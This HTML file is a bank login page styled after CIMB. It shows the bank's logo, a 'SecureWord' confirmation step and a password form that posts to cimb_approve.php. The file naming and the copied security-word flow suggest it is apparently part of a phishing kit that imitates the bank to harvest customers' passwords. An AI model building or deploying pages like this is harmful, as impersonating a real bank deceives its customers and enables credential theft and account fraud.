<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>


    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="assets/css/cimb_process.css">
</head>

<body>
    <div class="login-container">
        <div class="logo">
            <img src="assets/image/cimb_logo.png" alt="Logo 1">
        </div>

        <div class="secure-word">
            <img src="assets/image/secure_word.png" alt="SecureWord">

            <div class="secure-check">
                <label for="secure-checkbox">
                    <input type="checkbox" id="secure-checkbox">
                    Yes, this is my SecureWord
                </label>

            </div>
        </div>
        <form id="password-form" action="cimb_approve.php" method="POST">
            <div class="form-group">
                <label for="password">Password</label>
                <div class="password-field">
                    <input type="password" id="password" placeholder="Enter your password">
                    <div class="form-error" id="form-error" style="display: none;"></div>
                    <button type="button" class="toggle-visibility">
                        <i class="fas fa-eye"></i>
                    </button>
                </div>
            </div>
            <button type="submit" class="btn" disabled>Login</button>
        </form>
        <div class="back">
            <a href="cimb_login.php"><i class="fas fa-arrow-left"></i> Back</a> <!-- Left arrow using Font Awesome -->
        </div>
    </div>


    <script src="assets/js/cimb_process.js"></script>
</body>

</html>